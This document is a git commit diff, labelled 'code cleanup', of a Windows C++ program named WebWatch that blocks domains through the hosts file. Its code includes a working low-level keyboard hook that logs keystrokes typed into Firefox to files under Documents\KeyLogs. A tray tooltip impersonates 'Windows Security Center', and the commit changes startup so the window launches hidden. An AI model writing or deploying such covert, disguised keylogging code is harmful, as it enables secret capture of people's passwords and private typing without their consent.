08cd4e9b48582a91b67f13e9e524d70710a0dbd0
ewsc <alamovazamjon@gmail.com>
2023-12-20 02:07:53 +0300

    code cleanup

--- main.cpp
+++ main.cpp
@@ -23,11 +23,9 @@ std::ofstream logFile;
 NOTIFYICONDATA nid;
 bool browserKeyLogging = true;
 
-bool AddHostEntry(const std::string& domain, const std::string& ipAddress)
-{
+bool AddHostEntry(const std::string &domain, const std::string &ipAddress) {
     std::ofstream hostsFile(R"(C:\Windows\System32\drivers\etc\hosts)", std::ios_base::app);
-    if (hostsFile.is_open())
-    {
+    if (hostsFile.is_open()) {
         hostsFile << ipAddress << " " << domain << std::endl;
         hostsFile.close();
         return true;
@@ -35,18 +33,14 @@ bool AddHostEntry(const std::string& domain, const std::string& ipAddress)
     return false;
 }
 
-bool RemoveHostEntry(const std::string& domain, const std::string& ipAddress)
-{
+bool RemoveHostEntry(const std::string &domain, const std::string &ipAddress) {
     std::ifstream input(R"(C:\Windows\System32\drivers\etc\hosts)");
     std::ofstream output(R"(C:\Windows\System32\drivers\etc\hosts_temp)");
 
-    if (input.is_open() && output.is_open())
-    {
+    if (input.is_open() && output.is_open()) {
         std::string line;
-        while (std::getline(input, line))
-        {
-            if (line.find(ipAddress + " " + domain) == std::string::npos)
-            {
+        while (std::getline(input, line)) {
+            if (line.find(ipAddress + " " + domain) == std::string::npos) {
                 output << line << std::endl;
             }
         }
@@ -63,29 +57,25 @@ bool RemoveHostEntry(const std::string& domain, const std::string& ipAddress)
     return false;
 }
 
-LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
-{
-    if (nCode >= 0)
-    {
-        auto* pKeyboardStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
+LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode >= 0) {
+        auto *pKeyboardStruct = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);
         DWORD vkCode = pKeyboardStruct->vkCode;
 
-        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
-        {
-            // Get the foreground window
+        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
+
             HWND hwndForeground = GetForegroundWindow();
 
-            // Get the window title
+
             char windowTitle[256];
             GetWindowTextA(hwndForeground, windowTitle, sizeof(windowTitle));
 
             const auto title = std::string(windowTitle);
             const auto fireandfox = std::string("Firefox");
 
-            // Check if the window title contains browser keywords
-            if (title.contains(fireandfox) && browserKeyLogging)
-            {
-                // Handle the key press and log it
+
+            if (title.contains(fireandfox) && browserKeyLogging) {
+
                 logFile << vkCode << " ";
             }
         }
@@ -94,51 +84,32 @@ LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
     return CallNextHookEx(nullptr, nCode, wParam, lParam);
 }
 
-LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
-{
-    switch (uMsg)
-    {
-        case WM_CREATE:
-        {
-            CreateWindow("STATIC", "WebWatch welcomes you.",
-                         WS_VISIBLE | WS_CHILD,
-                         10, 5, 360, 20,
-                         hwnd, nullptr, nullptr, nullptr);
+LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
+    switch (uMsg) {
+        case WM_CREATE: {
+            CreateWindow("STATIC", "WebWatch welcomes you.", WS_VISIBLE | WS_CHILD, 10, 5, 360, 20, hwnd, nullptr,
+                         nullptr, nullptr);
 
-            CreateWindow("STATIC", "Enter the domain and IP address to block / unblock:",
-                         WS_VISIBLE | WS_CHILD,
-                         10, 35, 360, 20,
-                         hwnd, nullptr, nullptr, nullptr);
+            CreateWindow("STATIC", "Enter the domain and IP address to block / unblock:", WS_VISIBLE | WS_CHILD, 10, 35,
+                         360, 20, hwnd, nullptr, nullptr, nullptr);
 
-            hwndDomainInput = CreateWindow("EDIT", "",
-                                           WS_VISIBLE | WS_CHILD | WS_BORDER,
-                                           10, 65, 200, 30,
+            hwndDomainInput = CreateWindow("EDIT", "", WS_VISIBLE | WS_CHILD | WS_BORDER, 10, 65, 200, 30, hwnd,
+                                           nullptr, nullptr, nullptr);
+
+            hwndIpAddressInput = CreateWindow("EDIT", "", WS_VISIBLE | WS_CHILD | WS_BORDER, 10, 105, 200, 30, hwnd,
+                                              nullptr, nullptr, nullptr);
+
+            hwndBlockButton = CreateWindow("BUTTON", "Block", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON, 10, 145, 150, 30,
                                            hwnd, nullptr, nullptr, nullptr);
 
-            hwndIpAddressInput = CreateWindow("EDIT", "",
-                                              WS_VISIBLE | WS_CHILD | WS_BORDER,
-                                              10, 105, 200, 30,
-                                              hwnd, nullptr, nullptr, nullptr);
+            hwndUnblockButton = CreateWindow("BUTTON", "Unblock", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON, 170, 145, 150,
+                                             30, hwnd, nullptr, nullptr, nullptr);
 
-            hwndBlockButton = CreateWindow("BUTTON", "Block",
-                                           WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
-                                           10, 145, 150, 30,
-                                           hwnd, nullptr, nullptr, nullptr);
-
-            hwndUnblockButton = CreateWindow("BUTTON", "Unblock",
-                                             WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
-                                             170, 145, 150, 30,
-                                             hwnd, nullptr, nullptr, nullptr);
-
-            CreateWindow("STATIC", "Activate / Deactivate browser keylogging.",
-                         WS_VISIBLE | WS_CHILD,
-                         10, 195, 360, 20,
+            CreateWindow("STATIC", "Activate / Deactivate browser keylogging.", WS_VISIBLE | WS_CHILD, 10, 195, 360, 20,
                          hwnd, nullptr, nullptr, nullptr);
 
-            hwndInternetAccess = CreateWindow("BUTTON", "Activate / Deactivate",
-                                           WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
-                                           10, 225, 150, 30,
-                                           hwnd, nullptr, nullptr, nullptr);
+            hwndInternetAccess = CreateWindow("BUTTON", "Activate / Deactivate", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
+                                              10, 225, 150, 30, hwnd, nullptr, nullptr, nullptr);
 
             auto hInstance = reinterpret_cast<HINSTANCE>(GetWindowLongPtr(hwnd, GWLP_HINSTANCE));
 
@@ -153,30 +124,26 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
             strcpy(nid.szTip, "Windows Security Center");
             Shell_NotifyIcon(NIM_ADD, &nid);
 
-            // Install the keyboard hook
+
             HHOOK hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, hInstance, 0);
-            if (hKeyboardHook == nullptr)
-            {
+            if (hKeyboardHook == nullptr) {
                 MessageBox(hwnd, "Failed to install the keyboard hook.", "Error", MB_OK | MB_ICONERROR);
-            }
-            else
-            {
-                // Store the hook handle in the window user data
+            } else {
+
                 SetWindowLongPtr(hwnd, GWLP_USERDATA, reinterpret_cast<LONG_PTR>(hKeyboardHook));
             }
 
-            // Create the KeyLogs folder under the Documents folder
+
             PWSTR documentsPath;
-            if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Documents, 0, nullptr, &documentsPath)))
-            {
+            if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Documents, 0, nullptr, &documentsPath))) {
                 std::wstring keyLogsFolder = std::wstring(documentsPath) + L"\\KeyLogs";
                 CreateDirectory(reinterpret_cast<LPCSTR>(keyLogsFolder.c_str()), nullptr);
 
-                // Generate a unique file name using timestamp
+
                 std::time_t now = std::time(nullptr);
-                std::tm* timeInfo = std::localtime(&now);
+                std::tm *timeInfo = std::localtime(&now);
                 char timestamp[20];
-                std::strftime(timestamp, sizeof(timestamp), "%Y%m%d%H%M%S",timeInfo);
+                std::strftime(timestamp, sizeof(timestamp), "%Y%m%d%H%M%S", timeInfo);
 
                 std::string logFileName = "LOG_" + std::string(timestamp) + ".txt";
 
@@ -192,12 +159,9 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
         }
             break;
 
-        case WM_APP:
-        {
-            switch (LOWORD(lParam))
-            {
-                case WM_LBUTTONDBLCLK:
-                {
+        case WM_APP: {
+            switch (LOWORD(lParam)) {
+                case WM_LBUTTONDBLCLK: {
                     ShowWindow(hwnd, SW_RESTORE);
                     SetForegroundWindow(hwnd);
                     break;
@@ -206,11 +170,9 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
             break;
         }
 
-        case WM_COMMAND:
-        {
-            if (reinterpret_cast<HWND>(lParam) == hwndBlockButton)
-            {
-                // Handle the block button click
+        case WM_COMMAND: {
+            if (reinterpret_cast<HWND>(lParam) == hwndBlockButton) {
+
                 const int bufferSize = 256;
                 wchar_t domainBuffer[bufferSize];
                 wchar_t ipAddressBuffer[bufferSize];
@@ -224,18 +186,13 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
                 std::string domainUtf8(domain.begin(), domain.end());
                 std::string ipAddressUtf8(ipAddress.begin(), ipAddress.end());
 
-                if (AddHostEntry(domainUtf8, ipAddressUtf8))
-                {
+                if (AddHostEntry(domainUtf8, ipAddressUtf8)) {
                     MessageBox(hwnd, "Host entry added successfully.", "Success", MB_OK | MB_ICONINFORMATION);
-                }
-                else
-                {
+                } else {
                     MessageBox(hwnd, "Failed to add the host entry.", "Error", MB_OK | MB_ICONERROR);
                 }
-            }
-            else if (reinterpret_cast<HWND>(lParam) == hwndUnblockButton)
-            {
-                // Handle the unblock button click
+            } else if (reinterpret_cast<HWND>(lParam) == hwndUnblockButton) {
+
                 const int bufferSize = 256;
                 wchar_t domainBuffer[bufferSize];
                 wchar_t ipAddressBuffer[bufferSize];
@@ -249,40 +206,29 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
                 std::string domainUtf8(domain.begin(), domain.end());
                 std::string ipAddressUtf8(ipAddress.begin(), ipAddress.end());
 
-                if (RemoveHostEntry(domainUtf8, ipAddressUtf8))
-                {
+                if (RemoveHostEntry(domainUtf8, ipAddressUtf8)) {
                     MessageBox(hwnd, "Host entry removed successfully.", "Success", MB_OK | MB_ICONINFORMATION);
-                }
-                else
-                {
+                } else {
                     MessageBox(hwnd, "Failed to remove the host entry.", "Error", MB_OK | MB_ICONERROR);
                 }
-            }
-            else if (reinterpret_cast<HWND>(lParam) == hwndInternetAccess) {
+            } else if (reinterpret_cast<HWND>(lParam) == hwndInternetAccess) {
                 auto now = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
                 std::tm currentTime{};
                 localtime_s(&currentTime, &now);
 
-                // Check if the current time is within the specified range (8 am to 8 pm)
-                if (!browserKeyLogging)
-                {
+
+                if (!browserKeyLogging) {
                     MessageBox(hwnd, "Browser Keylogging enabled.", "Success", MB_OK | MB_ICONINFORMATION);
                     browserKeyLogging = true;
-                }
-                else
-                {
+                } else {
                     MessageBox(hwnd, "Browser Keylogging disabled.", "Success", MB_OK | MB_ICONINFORMATION);
                     browserKeyLogging = false;
                 }
-            }
-            else if ((reinterpret_cast<HWND>(lParam) == nullptr) && (LOWORD(wParam) == 1))
-            {
-                // Tray icon right-click menu command
-                switch (HIWORD(wParam))
-                {
+            } else if ((reinterpret_cast<HWND>(lParam) == nullptr) && (LOWORD(wParam) == 1)) {
+
+                switch (HIWORD(wParam)) {
                     case WM_LBUTTONUP:
-                    case WM_RBUTTONUP:
-                    {
+                    case WM_RBUTTONUP: {
                         POINT pt;
                         GetCursorPos(&pt);
 
@@ -296,21 +242,16 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
                         break;
                     }
                 }
-            }
-            else if (HIWORD(wParam) == 0 && LOWORD(wParam) == 1)
-            {
-                // Tray icon 'Exit' menu command
+            } else if (HIWORD(wParam) == 0 && LOWORD(wParam) == 1) {
                 PostMessage(hwnd, WM_CLOSE, 0, 0);
             }
             break;
         }
 
-        case WM_CLOSE:
-        {
-            // Clean up resources and close the log file
+        case WM_CLOSE: {
+
             auto hKeyboardHook = reinterpret_cast<HHOOK>(GetWindowLongPtr(hwnd, GWLP_USERDATA));
-            if (hKeyboardHook != nullptr)
-            {
+            if (hKeyboardHook != nullptr) {
                 UnhookWindowsHookEx(hKeyboardHook);
             }
 
@@ -320,25 +261,19 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
             break;
         }
 
-        case WM_DESTROY:
-        {
+        case WM_DESTROY: {
             Shell_NotifyIcon(NIM_DELETE, &nid);
             PostQuitMessage(0);
             break;
         }
 
-        case WM_SYSCOMMAND:
-        {
-            if (wParam == SC_MINIMIZE)
-            {
-                // Hide the window instead of minimizing it
+        case WM_SYSCOMMAND: {
+            if (wParam == SC_MINIMIZE) {
                 ShowWindow(hwnd, SW_HIDE);
                 return 0;
-            }
-            else if (wParam == SC_CLOSE) {
+            } else if (wParam == SC_CLOSE) {
                 auto hKeyboardHook = reinterpret_cast<HHOOK>(GetWindowLongPtr(hwnd, GWLP_USERDATA));
-                if (hKeyboardHook != nullptr)
-                {
+                if (hKeyboardHook != nullptr) {
                     UnhookWindowsHookEx(hKeyboardHook);
                 }
 
@@ -348,16 +283,13 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
             }
             break;
         }
-
         default:
             return DefWindowProc(hwnd, uMsg, wParam, lParam);
     }
-
     return 0;
 }
 
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
-{
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     const wchar_t CLASS_NAME[] = L"WebWatch";
 
     WNDCLASS wc = {};
@@ -367,48 +299,33 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     RegisterClass(&wc);
 
-    HWND hwnd = CreateWindowEx(
-            0,                              // Optional window styles.
-            reinterpret_cast<LPCSTR>(CLASS_NAME),                     // Window class
-            reinterpret_cast<LPCSTR>(L"WebWatch"),                  // Window text
-            WS_OVERLAPPEDWINDOW,            // Window style
+    HWND hwnd = CreateWindowEx(0, reinterpret_cast<LPCSTR>(CLASS_NAME), reinterpret_cast<LPCSTR>(L"WebWatch"),
+                               WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 400, 300, nullptr, nullptr, hInstance,
+                               nullptr);
 
-            // Size and position
-            CW_USEDEFAULT, CW_USEDEFAULT, 400, 300,
-
-            nullptr,       // Parent window
-            nullptr,       // Menu
-            hInstance,  // Instance handle
-            nullptr        // Additional application data
-    );
-
-    if (hwnd == nullptr)
-    {
+    if (hwnd == nullptr) {
         return 0;
     }
 
     int screenWidth = GetSystemMetrics(SM_CXSCREEN);
     int screenHeight = GetSystemMetrics(SM_CYSCREEN);
 
-    // Get window dimensions
     RECT rect;
     GetWindowRect(hwnd, &rect);
     int windowWidth = rect.right - rect.left;
     int windowHeight = rect.bottom - rect.top;
 
-    // Calculate window position
     int posX = (screenWidth - windowWidth) / 2;
     int posY = (screenHeight - windowHeight) / 2;
 
-    // Set window position
-    SetWindowPos(hwnd, NULL, posX, posY, 0, 0, SWP_NOSIZE | SWP_NOZORDER);
+    SetWindowPos(hwnd, nullptr, posX, posY, 0, 0, SWP_NOSIZE | SWP_NOZORDER);
 
-
-    ShowWindow(hwnd, nCmdShow);
+    //START UNTRAYED, COMMENT SW_HIDE
+    //ShowWindow(hwnd, nCmdShow);
+    ShowWindow(hwnd, SW_HIDE);
 
     MSG msg = {};
-    while (GetMessage(&msg, nullptr, 0, 0))
-    {
+    while (GetMessage(&msg, nullptr, 0, 0)) {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
